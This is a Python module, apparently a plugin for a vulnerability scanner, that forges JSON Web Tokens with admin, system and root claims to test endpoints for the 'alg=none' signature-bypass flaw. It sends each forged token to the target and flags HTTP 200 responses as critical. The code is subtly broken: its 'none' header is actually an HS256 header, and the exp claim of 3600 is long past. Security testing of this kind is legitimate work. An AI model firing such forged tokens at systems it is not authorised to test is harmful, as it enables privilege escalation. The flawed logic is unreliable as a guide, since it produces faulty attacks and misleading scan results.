import jwt
"""JWT Algorithm None Attack Scanner"""

from typing import Dict, List, Optional, Any
import requests
import jwt
import uuid
from datetime import datetime
from urllib.parse import urljoin
from .base_scanner import BaseScanner
from .utils.logger import setup_scanner_logger

class JWT2Scanner(BaseScanner):
    def __init__(self):
        super().__init__()
        self.logger = setup_scanner_logger("jwt2")
        self.context = {}
        
    def scan(self, url: str, method: str, path: str, response: requests.Response, token: Optional[str] = None, 
             headers: Optional[Dict[str, str]] = None, tokens: Optional[Dict[str, List[Dict[str, Any]]]] = None, 
             context: Optional[Dict[str, Any]] = None) -> List[Dict[str, Any]]:
        vulnerabilities = []
        
        # Store context if provided
        if context:
            self.context = context
            self.logger.info(f"Received context with {len(context)} items")
            
            # Use finding IDs from previous scans for dependency tracking
            dependencies = context.get('finding_ids', [])
            self.logger.info(f"Using {len(dependencies)} dependencies from previous findings")
            
            # Use credentials discovered by other scanners
            credentials = context.get('credentials', [])
            self.logger.info(f"Using {len(credentials)} credentials from other scanners")
        
        # Generate correlation ID for tracking related requests
        correlation_id = str(uuid.uuid4())
        
        # Test payloads for algorithm none attack
        test_payloads = [
            {"sub": "admin", "role": "admin", "exp": 3600},
            {"sub": "system", "role": "system", "exp": 3600},
            {"sub": "root", "role": "superuser", "exp": 3600}
        ]
        
        for payload in test_payloads:
            try:
                # Create forged token with alg=none attack
                # First create a normal token
                normal_token = jwt.encode(payload, 'dummy_key', algorithm='HS256')
                
                # Then manually craft a token with alg=none
                token_parts = normal_token.split('.')
                if len(token_parts) == 3:
                    # Replace the header with alg:none
                    none_header = jwt.encode({"alg": "none", "typ": "JWT"}, '', algorithm='HS256').split('.')[0]
                    none_token = f"{none_header}.{token_parts[1]}."
                    
                    # Track authentication state
                    auth_state = {
                        "token": none_token,
                        "auth_type": "bearer",
                        "attack": "alg_none"
                    }
                    
                    # Test the forged token
                    test_headers = {"Authorization": f"Bearer {none_token}"}
                    
                    # Use urljoin to properly construct the URL
                    test_url = urljoin(url, path)
                    test_resp = requests.get(
                        test_url,
                        headers=test_headers,
                        timeout=5
                    )
                    
                    # Capture transaction for evidence
                    request_data, response_data = self.capture_transaction(
                        test_resp,
                        auth_state=auth_state,
                        correlation_id=correlation_id
                    )
                    
                    if test_resp.status_code == 200:
                        finding = {
                            "type": "JWT_ALG_NONE",
                            "severity": "CRITICAL",
                            "detail": "Successfully bypassed JWT signature verification using alg=none attack",
                            "evidence": {
                                "jwt_request": request_data,
                                "jwt_response": response_data,
                                "auth_state": auth_state,
                                "correlation_id": correlation_id,
                                "payload": payload
                            },
                            "dependencies": context.get('finding_ids', []) if context else [],
                            "context_update": {
                                "vulnerable_jwt_endpoints": self.context.get("vulnerable_jwt_endpoints", []) + [path],
                                "jwt_alg_none_vulnerable": True
                            }
                        }
                        vulnerabilities.append(finding)
                        self.logger.warning(f"Found JWT algorithm none vulnerability")
                        
            except requests.RequestException as e:
                self.logger.error(f"Error testing JWT algorithm none attack: {str(e)}")
                
        return vulnerabilities
    
    def capture_transaction(self, response: requests.Response, auth_state: Dict[str, Any] = None, 
                           correlation_id: str = None) -> tuple:
        """Capture request/response details for evidence"""
        request = response.request
        
        req_data = {
            "method": request.method,
            "url": request.url,
            "headers": dict(request.headers),
            "body": request.body,
            "timestamp": datetime.utcnow().isoformat()
        }
        
        res_data = {
            "status_code": response.status_code,
            "headers": dict(response.headers),
            "body": response.text[:500],  # Truncate long responses
            "timestamp": datetime.utcnow().isoformat()
        }
        
        if auth_state:
            req_data["auth_state"] = auth_state
            res_data["auth_state"] = auth_state
            
        if correlation_id:
            req_data["correlation_id"] = correlation_id
            res_data["correlation_id"] = correlation_id
            
        return req_data, res_data
    
    def update_context(self, context_update: Dict[str, Any]) -> None:
        """Update scanner context with new information"""
        if not hasattr(self, 'context'):
            self.context = {}
            
        self.context.update(context_update)

scan = JWT2Scanner().scan
